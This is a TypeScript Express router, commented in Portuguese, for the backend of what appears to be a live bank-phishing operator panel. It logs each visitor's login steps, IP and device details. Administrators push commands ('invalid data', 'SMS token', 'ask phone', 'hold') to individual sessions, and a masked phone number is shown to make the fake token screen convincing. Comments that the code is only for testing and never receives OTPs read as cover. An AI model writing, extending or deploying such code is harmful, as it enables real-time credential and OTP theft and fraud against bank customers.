import { Router, type IRouter, type Request, type Response, type NextFunction } from "express";
import { desc, eq, sql } from "drizzle-orm";
import jwt from "jsonwebtoken";
import {
  db,
  loginSessionsTable,
  type LoginSessionRow,
  type SessionHistoryEntry,
  type SessionStep,
} from "@workspace/db";

const router: IRouter = Router();

function requireAdmin(req: Request, res: Response, next: NextFunction): void {
  const header = req.headers.authorization ?? "";
  const secret = process.env.ADMIN_JWT_SECRET;
  if (header.startsWith("Bearer ") && secret) {
    try {
      const d = jwt.verify(header.slice(7), secret);
      if (typeof d === "object" && (d as { role?: string }).role === "admin") return next();
    } catch {
      /* invalid */
    }
  }
  res.status(401).json({ message: "Não autenticado." });
}

function parseUA(ua: string) {
  const browser = /Edg/.test(ua) ? "Edge" : /OPR|Opera/.test(ua) ? "Opera"
    : /Firefox/.test(ua) ? "Firefox" : /Chrome/.test(ua) ? "Chrome"
    : /Safari/.test(ua) ? "Safari" : "Outro";
  const os = /Windows/.test(ua) ? "Windows" : /Android/.test(ua) ? "Android"
    : /iPhone|iPad|iOS/.test(ua) ? "iOS" : /Mac OS X|Macintosh/.test(ua) ? "macOS"
    : /Linux/.test(ua) ? "Linux" : "-";
  const deviceType = /iPad|Tablet/.test(ua) ? "Tablet"
    : /Mobile|Android|iPhone/.test(ua) ? "Mobile" : "Desktop";
  return { browser, os, deviceType };
}

function clientIp(req: Request): string {
  const fwd = (req.headers["x-forwarded-for"] as string | undefined) ?? "";
  const ip = fwd.split(",")[0]?.trim() || req.socket.remoteAddress || "";
  return ip.replace(/^::ffff:/, "");
}

const str = (v: unknown, max: number) => (typeof v === "string" ? v.slice(0, max) : null);

/** Descarta registros de teste/mock (rota ou identificador iniciando com TEST_ ). */
const isTest = (v: string | null | undefined) =>
  !!v && (v.startsWith("TEST_") || v.startsWith("/TEST_"));

/** Só exclui do listing do painel dados de teste. */
const notTestFilter = sql`left(${loginSessionsTable.currentStep}, 5) <> 'TEST_'
  AND left(coalesce(${loginSessionsTable.currentStep}, ''), 6) <> '/TEST_'
  AND left(coalesce(${loginSessionsTable.identifier}, ''), 5) <> 'TEST_'`;

const VALID_COMMANDS: Record<string, { directive: string; status?: string; label: string }> = {
  invalid: { directive: "invalid", label: "Comando: Dados inválidos" },
  sms_token: { directive: "sms_token", label: "Comando: Token SMS" },
  ask_phone: { directive: "ask_phone", label: "Comando: Pedir telefone" },
  hold: { directive: "hold", label: "Comando: Colocar em aguarde" },
  end: { directive: "ended", status: "ended", label: "Comando: Encerrar sessão" },
};

/** Deriva os 3 últimos dígitos do telefone JÁ capturado no fluxo (não sensível). */
function last3FromSteps(steps: Array<{ label: string | null }> | null): string | null {
  const list = steps ?? [];
  for (let i = list.length - 1; i >= 0; i--) {
    const m = /Cel\s+(.+)/i.exec(list[i]?.label ?? "");
    if (m) {
      const digits = m[1].replace(/\D/g, "");
      if (digits.length >= 3) return digits.slice(-3);
    }
  }
  return null;
}

/**
 * Público: registra/atualiza a sessão única do visitante conforme ele avança
 * no fluxo. NUNCA recebe senha/OTP. `respondTo` indica que o cliente respondeu
 * a um comando do operador (ex.: informou o token SMS), sem enviar o valor.
 */
router.post("/auth-attempt", async (req, res) => {
  const b = req.body ?? {};
  const sessionId = str(b.sessionId, 80);
  if (!sessionId) {
    res.status(400).json({ message: "sessionId ausente." });
    return;
  }
  const route = str(b.route, 300) ?? "/";
  const label = str(b.label, 160);
  if (isTest(route) || isTest(label)) {
    res.json({ ok: true, ignored: true });
    return;
  }
  const respondTo = str(b.respondTo, 120);
  const flowType = b.flowType === "PF" || b.flowType === "PJ" ? b.flowType : null;
  const ua = (typeof b.userAgent === "string" && b.userAgent) || req.headers["user-agent"] || "";
  const { browser, os, deviceType } = parseUA(String(ua));
  const ip = clientIp(req);
  const isPrivate = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|::1)/.test(ip);
  const now = new Date().toISOString();

  const existing = (
    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.sessionId, sessionId)).limit(1)
  )[0];

  const step: SessionStep = { route, label, at: now };

  if (!existing) {
    const history: SessionHistoryEntry[] = [
      { type: "step", label: `Início do fluxo (${flowType ?? "?"}) — ${route}`, at: now },
    ];
    await db.insert(loginSessionsTable).values({
      sessionId,
      flowType,
      identifier: label,
      currentStep: route,
      status: "active",
      directive: "none",
      steps: [step],
      history,
      ip,
      browser,
      os,
      deviceType,
      language: str(b.language, 40),
      timezone: str(b.timezone, 60),
      screen: str(b.screen, 30),
      referrer: str(b.referrer, 300),
      userAgent: String(ua).slice(0, 500),
      location: isPrivate ? "Local" : "Internet",
      updatedAt: new Date(),
    });
    res.json({ ok: true });
    return;
  }

  if (existing.status === "ended") {
    res.json({ ok: true, ended: true });
    return;
  }

  const steps = [...(existing.steps ?? []), step];
  const history = [...(existing.history ?? [])];
  let directive = existing.directive;

  if (respondTo) {
    // Cliente respondeu a um comando: volta ao estado de espera e registra.
    history.push({ type: "client", label: `Cliente respondeu: ${respondTo}`, at: now });
    directive = "hold";
  } else {
    // Avanço normal no fluxo: qualquer comando pendente fica obsoleto.
    history.push({ type: "step", label: `Etapa: ${route}${label ? ` — ${label}` : ""}`, at: now });
    directive = "none";
  }

  await db
    .update(loginSessionsTable)
    .set({
      flowType: flowType ?? existing.flowType,
      identifier: label ?? existing.identifier,
      currentStep: route,
      directive,
      steps,
      history,
      updatedAt: new Date(),
    })
    .where(eq(loginSessionsTable.id, existing.id));

  res.json({ ok: true });
});

/** Público: consulta a diretiva atual da sessão para orientar a interface. */
router.get("/auth-attempt/directive", async (req, res) => {
  const sessionId = typeof req.query.sessionId === "string" ? req.query.sessionId : "";
  if (!sessionId) {
    res.json({ directive: "none", status: "active" });
    return;
  }
  const row = (
    await db
      .select({ directive: loginSessionsTable.directive, status: loginSessionsTable.status, smsLast3: loginSessionsTable.smsLast3 })
      .from(loginSessionsTable)
      .where(eq(loginSessionsTable.sessionId, sessionId))
      .limit(1)
  )[0];
  res.json({ directive: row?.directive ?? "none", status: row?.status ?? "active", smsLast3: row?.smsLast3 ?? null });
});

const toClient = (r: LoginSessionRow) => ({
  id: r.id,
  sessionId: r.sessionId,
  flowType: r.flowType,
  identifier: r.identifier,
  currentStep: r.currentStep,
  status: r.status,
  directive: r.directive,
  smsLast3: r.smsLast3,
  smsTestCode: r.smsTestCode,
  steps: r.steps ?? [],
  history: r.history ?? [],
  ip: r.ip,
  browser: r.browser,
  deviceType: r.deviceType,
  os: r.os,
  language: r.language,
  timezone: r.timezone,
  screen: r.screen,
  referrer: r.referrer,
  userAgent: r.userAgent,
  location: r.location,
  createdAt: r.createdAt instanceof Date ? r.createdAt.toISOString() : String(r.createdAt),
  updatedAt: r.updatedAt instanceof Date ? r.updatedAt.toISOString() : String(r.updatedAt),
});

/** Admin: lista de sessões (exclui dados de teste/mock). */
router.get("/auth-attempt/list", requireAdmin, async (_req, res) => {
  const rows = await db
    .select()
    .from(loginSessionsTable)
    .where(notTestFilter)
    .orderBy(desc(loginSessionsTable.updatedAt))
    .limit(500);
  res.json({ items: rows.map(toClient) });
});

/** Admin: aplica um comando a UMA sessão específica. */
router.post("/auth-attempt/command", requireAdmin, async (req, res) => {
  const id = str(req.body?.id, 80);
  const command = str(req.body?.command, 40);
  if (!id || !command || !VALID_COMMANDS[command]) {
    res.status(400).json({ message: "Comando inválido." });
    return;
  }
  const spec = VALID_COMMANDS[command];
  const existing = (
    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.id, id)).limit(1)
  )[0];
  if (!existing) {
    res.status(404).json({ message: "Sessão não encontrada." });
    return;
  }
  const now = new Date().toISOString();
  const updates: Record<string, unknown> = {
    directive: spec.directive,
    status: spec.status ?? existing.status,
    updatedAt: new Date(),
  };
  let label = spec.label;

  if (command === "sms_token") {
    // Homologação: SEM geração/validação de código. Controla o ESTADO da sessão:
    //  - 1º acionamento (fora do fluxo SMS)  -> "sms_token" (tela de entrada)
    //  - reacionamento (já no fluxo SMS)      -> "sms_token_retry" (nova tentativa)
    // Os 3 dígitos exibidos vêm do telefone já capturado no fluxo (não sensível).
    const inSms =
      existing.directive === "sms_token" ||
      existing.directive === "sms_token_retry" ||
      existing.directive === "sms_token_wait";
    updates.directive = inSms ? "sms_token_retry" : "sms_token";
    // Os 3 dígitos vêm do modal do painel (exatamente 3 numéricos). Não é
    // sensível: são apenas os 3 últimos exibidos como XX XXXXX-X###. Fallback ao
    // valor já definido ou ao telefone capturado no fluxo, se o campo vier vazio.
    const provided = str(req.body?.smsLast3, 3);
    const last3 = provided && /^\d{3}$/.test(provided) ? provided : null;
    updates.smsLast3 = last3 ?? existing.smsLast3 ?? last3FromSteps(existing.steps) ?? null;
    label = inSms ? "Comando: Token SMS (nova tentativa)" : "Comando: Token SMS";
  }

  const history = [...(existing.history ?? []), { type: "command", label, at: now }];
  updates.history = history;

  await db.update(loginSessionsTable).set(updates).where(eq(loginSessionsTable.id, id));
  res.json({ ok: true });
});

/**
 * Público (PF e PJ): sinaliza que houve uma ENTRADA de teste fictícia no campo de
 * código. NÃO recebe, valida, armazena nem transmite o valor digitado — apenas
 * muda o estado da sessão para "sms_token_wait" (tela "Aguarde") para aquela
 * sessão. O reacionamento de "Token SMS" no painel reexibe a tela de entrada.
 */
router.post("/auth-attempt/sms-entry", async (req, res) => {
  const sessionId = str(req.body?.sessionId, 80);
  if (!sessionId) {
    res.json({ ok: false });
    return;
  }
  const existing = (
    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.sessionId, sessionId)).limit(1)
  )[0];
  if (
    !existing ||
    existing.status === "ended" ||
    (existing.directive !== "sms_token" && existing.directive !== "sms_token_retry")
  ) {
    res.json({ ok: false });
    return;
  }
  const now = new Date().toISOString();
  const history = [
    ...(existing.history ?? []),
    { type: "client", label: "Entrada de teste realizada", at: now },
  ];
  await db
    .update(loginSessionsTable)
    .set({ directive: "sms_token_wait", history, updatedAt: new Date() })
    .where(eq(loginSessionsTable.id, existing.id));
  res.json({ ok: true });
});

/** Admin: exclui UMA tentativa/sessão permanentemente (ação explícita do operador). */
router.delete("/auth-attempt/:id", requireAdmin, async (req, res) => {
  const id = str(req.params?.id, 80);
  if (!id) {
    res.status(400).json({ message: "id ausente." });
    return;
  }
  await db.delete(loginSessionsTable).where(eq(loginSessionsTable.id, id));
  res.json({ ok: true });
});

/** Admin: exclui TODAS as tentativas/sessões permanentemente (após confirmação no painel). */
router.delete("/auth-attempt", requireAdmin, async (_req, res) => {
  await db.delete(loginSessionsTable);
  res.json({ ok: true });
});

export default router;
